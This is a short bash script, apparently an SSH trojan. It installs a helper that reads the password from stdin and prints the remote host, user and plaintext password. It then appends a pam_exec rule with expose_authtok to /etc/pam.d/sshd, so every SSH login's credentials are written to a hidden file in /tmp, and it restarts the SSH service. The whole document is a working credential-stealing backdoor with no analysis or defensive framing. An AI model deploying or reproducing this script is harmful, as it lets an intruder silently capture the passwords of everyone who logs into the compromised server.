#!/bin/bash

file_log="/tmp/.log_sshtrojan1.txt"

#check file_log exist
if [[ -f $file_log ]]; then 
    echo "File $file_log was created"
else
    touch $file_log
fi

path_script="/usr/local/bin/script.sh"


cat << EOF >$path_script
#!/bin/bash
read password
echo "Rhost: \$PAM_RHOST"
echo "Service: \$PAM_SERVICE"
echo "TTY: \$PAM_TTY"
echo "User: \$PAM_USER"
echo "Password : \$password"
exit \$?
EOF


chmod +x $path_script
echo "Creat file $path_script to run script"

file_sshd="/etc/pam.d/sshd"
cat << EOF >> $file_sshd 
@include common-auth
#use module pam_exec to call an external command
auth       required   pam_exec.so   expose_authtok   seteuid   log=$file_log   $path_script
EOF

#ssh restarting
/etc/init.d/ssh restart
